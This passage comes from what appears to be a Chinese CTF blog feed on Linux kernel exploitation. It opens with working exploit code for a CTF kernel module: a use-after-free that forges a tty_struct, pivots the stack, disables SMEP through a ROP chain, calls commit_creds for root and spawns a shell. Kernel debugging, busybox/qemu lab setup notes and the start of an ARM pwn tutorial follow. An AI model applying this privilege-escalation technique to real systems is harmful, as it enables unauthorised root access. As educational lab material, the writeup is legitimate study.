(*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">int</span> (*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xffffffff810a1420</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> xchgeaxesp = <span class="number">0xffffffff810e81e8</span>;         <span class="comment">// 0xffffffff810e81e8 : xchg eax, esp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov %cs, tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfq; popq tf+16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %rsp, tf+24;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %ss, tf+32;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// puts(&quot;status saved!&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> rop[<span class="number">30</span>] = &#123;</span><br><span class="line">        <span class="number">0xffffffff810d238d</span>,         <span class="comment">// pop rdi ; ret</span></span><br><span class="line">        <span class="number">0x6f0</span>,</span><br><span class="line">        <span class="number">0xffffffff81004d80</span>,         <span class="comment">// mov cr4, rdi ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        get_root,</span><br><span class="line">        <span class="number">0xffffffff81063694</span>,         <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xffffffff814ee0a4</span>,         <span class="comment">// opcode: 48 cf iretq</span></span><br><span class="line">    &#125;;</span><br><span class="line">    tf.rip = get_shell;</span><br><span class="line">    *(struct trap_frame*)(&amp;rop[<span class="number">8</span>]) = tf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> base  = xchgeaxesp &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">    mmap(base, <span class="number">0x3000</span>, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(xchgeaxesp&amp;<span class="number">0xffffffff</span>, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">tty_ops</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    tty_ops.ioctl = xchgeaxesp;</span><br><span class="line">    <span class="keyword">uint64_t</span> fake_tty[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line">    fake_tty[<span class="number">3</span>] = &amp;tty_ops;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd_tty, <span class="number">0</span>, <span class="number">0</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERROR"><a href="#ERROR" class="headerlink" title="ERROR"></a>ERROR</h2><ul><li>musl-gcc 编译 32bit出错</li><li>ROPgadget 计算jmp relative地址错误</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4i 0xffffffff8181bfc5</span></span><br><span class="line">   0xffffffff8181bfc5:mov    rsp,rax</span><br><span class="line">   0xffffffff8181bfc8:dec    ebx</span><br><span class="line">   0xffffffff8181bfca:jmp    0xffffffff8181bf7e</span><br><span class="line">   0xffffffff8181bfcc:nop    DWORD PTR [rax+0x0]</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/hx 0xffffffff8181bfca</span></span><br><span class="line">0xffffffff8181bfca:0xb2eb</span><br></pre></td></tr></table></figure><p>ROPgadget所显示的gadget为<code>0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf83</code>。</p><p>从pwndbg得到opcode<code>ebb2</code>，是<code>jmp rel8</code>类型<a href="http://ref.x86asm.net/coder64.html#xEB">ref</a>，八位相对地址跳转<code>b2</code>最高位为1，是负数-0x4e，也就是向低地址跳转，<code>0xffffffff8181bfcc-0x4e = 0xffffffff8181bf7e</code>。</p><blockquote><p>2020-10-30更新</p></blockquote><h2 id="编译加载简单module"><a href="#编译加载简单module" class="headerlink" title="编译加载简单module"></a>编译加载简单module</h2><p>为了方便地获得<code>struct cred</code>和<code>struct tty_struct</code>的大小，编译简单的module。</p><h3 id="1-编译内核"><a href="#1-编译内核" class="headerlink" title="1. 编译内核"></a>1. 编译内核</h3><p>这里随便用了个版本，实际上应该获取题目内核版本，下载其源码编译。<a href="#jump1">Compile Kernel</a></p><h3 id="2-编译busybox"><a href="#2-编译busybox" class="headerlink" title="2. 编译busybox"></a>2. 编译busybox</h3><p>在<a href="https://busybox.net/">官网</a>下载源码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bzip2 -d -v busybox-1.32.0.tar.bz2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar xvf busybox-1.32.0.tar</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> busybox-1.32.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make menuconfig    <span class="comment"># 进入setting，勾上Build static binary(no shared libs)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make install -j4   <span class="comment"># 4是编译线程数，根据情况改</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> _install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir proc sys</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch init pack</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod +x init</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod +x pack</span></span><br></pre></td></tr></table></figure><p>在init中写入如下(注意更改模块名称)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="meta">#</span><span class="bash"> insmod /xxx.ko <span class="comment"># load ko</span></span></span><br><span class="line">mdev -s # We need this to find /dev/sda later</span><br><span class="line">echo -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">exec</span> /bin/sh <span class="comment">#root</span></span></span><br></pre></td></tr></table></figure><p>在pack里写入打包命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="3-编写编译module"><a href="#3-编写编译module" class="headerlink" title="3. 编写编译module"></a>3. 编写编译module</h3><p>在kernel目录下新建文件夹，创建源码文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir test_module</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> test_module</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch hello.c Makefile</span></span><br></pre></td></tr></table></figure><p>在hello.c中写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">c1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> <span class="title">t1</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!\n&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; sizeof cred: 0x%lx \n&quot;</span>, <span class="keyword">sizeof</span>(c1));</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; sizeof tty_struct: 0x%lx&quot;</span>, <span class="keyword">sizeof</span>(t1));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure><p>在Makefile中写入</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /home/liu/src/kernel/linux-5.4.72</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M-<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure><p>然后<code>make</code></p><h3 id="4-启动系统"><a href="#4-启动系统" class="headerlink" title="4. 启动系统"></a>4. 启动系统</h3><p>将hello.ko放入到busybox的_install目录下，使用pack打包。</p><p>将生成的rootfs.cpio，bzImage放在一个文件夹下面，并新建启动脚本<code>boot.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append &quot;console=ttyS0 root=/dev/ram oops=panic panic=1 kalsr&quot; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">--nographic \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line"><span class="meta">#</span><span class="bash">-gdb tcp::1234 \</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-S</span></span><br></pre></td></tr></table></figure><p>执行boot.sh就可以看到输出的大小了。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgmodule_test.png"></p><h2 id="to-do-list"><a href="#to-do-list" class="headerlink" title="to do list"></a>to do list</h2><ol><li><p><del>如何定位call rax/call [rax+0x38]（tty_operation)</del></p><p>智熄了。。直接看call backtrace。从某个地址向前查看指令，可能会遇到指令不对齐的问题，多试几个数字，直到当前地址的指令显示正确。如地址<code>0xffffffff814dc0c6</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10i 0xffffffff814dc0c6-1</span></span><br><span class="line">   0xffffffff814dc0c5:  cmp    BYTE PTR [rcx+rcx*4-0x9],cl</span><br><span class="line">   0xffffffff814dc0c9:  mov    r15d,eax    # 未对齐</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10i 0xffffffff814dc0c6-2</span></span><br><span class="line">   0xffffffff814dc0c4:  push   rax</span><br><span class="line">   0xffffffff814dc0c5:  cmp    BYTE PTR [rcx+rcx*4-0x9],cl</span><br><span class="line">   0xffffffff814dc0c9:  mov    r15d,eax    # 未对齐</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/10i 0xffffffff814dc0c6-3</span></span><br><span class="line">   0xffffffff814dc0c3:  call   QWORD PTR [rax+0x38]</span><br><span class="line">   0xffffffff814dc0c6:  mov    rdi,r14    # 对齐成功</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p><del>struct size 计算。编译简单module <a href="http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">ref1</a> <a href="https://www.anquanke.com/post/id/203399#h2-10">ref2</a></del></p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html">How to compile and install linux kernel 5.6.9 from souce code?</a></li><li><a href="http://mgalgs.github.io/2012/03/23/how-to-build-a-custom-linux-kernel-for-qemu.html">How to Build A Custom Linux Kernel For Qemu?</a></li><li><a href="https://m4x.fun/post/linux-kernel-pwn-abc-1">Linux Kernel Pwn ABC(Ⅰ)</a></li><li><a href="https://m4x.fun/post/linux-kernel-pwn-abc-2/">Linux Kernel Pwn ABC(II)</a></li><li><a href="https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/">Kernel调试文件总结</a></li><li><a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">What is the difference between the following kernel Makefile terms: vmLinux, vmlinuz, vmlinux.bin, zimage &amp; bzimage?</a></li><li><a href="https://www.anquanke.com/post/id/201043">Kernel Pwn 学习之路(一)</a></li><li><a href="https://stackoverflow.com/questions/11756153/whats-the-difference-between-iret-and-iretd-iretq">what’s the difference between iret and iretd,iretq?</a></li><li><a href="http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html">How to share files instantly between virtual machines and host</a></li><li><a href="https://xz.aliyun.com/t/4529">Linux Pwn技巧总结_1 – V1NKe</a></li><li><a href="https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">NCSTISC Linux Kernel PWN450 Writeup</a></li><li><a href="%5Bhttp://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%5D(http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)">内核Pwn 环境搭建</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;内核文件区别&quot;&gt;&lt;a href=&quot;#内核文件区别&quot; class=&quot;headerlink&quot; title=&quot;内核文件区别&quot;&gt;&lt;/a&gt;内核文件区别&lt;/h3&gt;&lt;p&gt;&lt;code&gt;vmlinux&lt;/code&gt; 是静态链接的可执行文件，未压缩的内核，最原始的文件，可以用来调试。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vmlinuz&lt;/code&gt; 是可引导的、压缩的内核。没有调试信息等数据，不可用于调试。启动时会自解压，通常会显示以下信息&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Decompressing Linux... done&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Booting the kernel.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;zImage&lt;/code&gt; 是经过压缩的小内核（小于512KB）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bzImage&lt;/code&gt; 是经过压缩的大内核（大于512KB）。&lt;/p&gt;
&lt;h3 id=&quot;Initial-Ramdisk&quot;&gt;&lt;a href=&quot;#Initial-Ramdisk&quot; class=&quot;headerlink&quot; title=&quot;Initial Ramdisk&quot;&gt;&lt;/a&gt;Initial Ramdisk&lt;/h3&gt;&lt;p&gt;名字类似&lt;code&gt;initramfs.cpio&lt;/code&gt; 文件，一般可以使用cpio读取其中的文件。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; find . | cpio -o --format=newc &amp;gt; initramfs.cpio &lt;span class=&quot;comment&quot;&gt;# compress&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo cpio -idmv &amp;lt; initramfs.cpio &lt;span class=&quot;comment&quot;&gt;# depress&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;有时也经过了gzip的压缩。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; mv initramfs.cpio initramfs.cpio.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; gunzip initramfs.cpio.gz	&lt;span class=&quot;comment&quot;&gt;# 解压得到initramfs.cpio&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; cpio -idmv &amp;lt; initramfs.cpio&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;更改为正确的后缀之后，图形界面“归档管理器”也可以打开。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="Kernel Pwn" scheme="http://hhdx.xyz/tags/Kernel-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Arm Pwn</title>
    <link href="http://hhdx.xyz/2020/10/17/Arm-pwn/"/>
    <id>http://hhdx.xyz/2020/10/17/Arm-pwn/</id>
    <published>2020-10-17T09:35:26.000Z</published>
    <updated>2020-11-16T07:05:11.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install qemu-user gdb-multiarch</span></span><br></pre></td></tr></table></figure><p>安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。</p><h3 id="动态链接程序"><a href="#动态链接程序" class="headerlink" title="动态链接程序"></a>动态链接程序</h3><p>对于动态链接的程序，还需要安装跨平台的lib。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-cache search <span class="string">&quot;libc&quot;</span> | grep arm</span></span><br></pre></td></tr></table></figure><p>安装类似libc6-ARCH-cross。</p><p>动态链接库被安装在类似<code>/usr/arm-linux-gnueabihf/</code>的路径。qemu不知道动态链接的位置，它预期在类似<code>/etc/qemu-binfmt/arm</code>的路径，所以可以设置软链接来避免用<code>-L</code>来指定链接库位置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 <span class="comment"># 对于aarch64</span></span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -L /usr/arm-linux-gnueabihf ./bin</span></span><br></pre></td></tr></table></figure><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./bin</span></span><br></pre></td></tr></table></figure><p>gdb-multiarch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb-multiarch</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> arch arm</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> target remote :1234</span></span><br></pre></td></tr></table></figure><h3 id="安装binutils"><a href="#安装binutils" class="headerlink" title="安装binutils"></a>安装binutils</h3><p>如果不安装，pwntools某些功能会报错。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search &quot;binutils&quot; | grep arm</span><br></pre></td></tr></table></figure><h2 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h2><p>不像X86，ARM是精简指令集，在寄存器上执行所有的运算，使用Load/Store指令访存。这意味着将内存中的某个32bit的值加一需要三种类型的指令（Load，Increment，Store）。</p><p>ARM有两种模式，ARM模式和Thumb模式。Thumb指令可以是2字节或4字节。</p><p>与X86的不同之处：</p><ul><li>在ARM上大多数指令可以用来条件执行</li><li>X86是小端存储</li><li>ARM在version 3之前也是小端，后面变成大端存储，并且提供了在大端和小端之间转换的功能。</li></ul><p>在ARM各个版本中也存在不同之处，该教程[4]以最通用的方式来教学，讲解32bit ARM汇编，示例面向32bit ARM v6。ARM命名：</p><table><thead><tr><th>ARM family</th><th>ARM architecture</th></tr></thead><tbody><tr><td>ARM7</td><td>ARM v4</td></tr><tr><td>ARM9</td><td>ARM v5</td></tr><tr><td>ARM11</td><td>ARM V6</td></tr><tr><td>Cortex-A</td><td>ARM V7-A</td></tr><tr><td>Cortex-R</td><td>ARM V7-R</td></tr><tr><td>Cortex-M</td><td>ARM 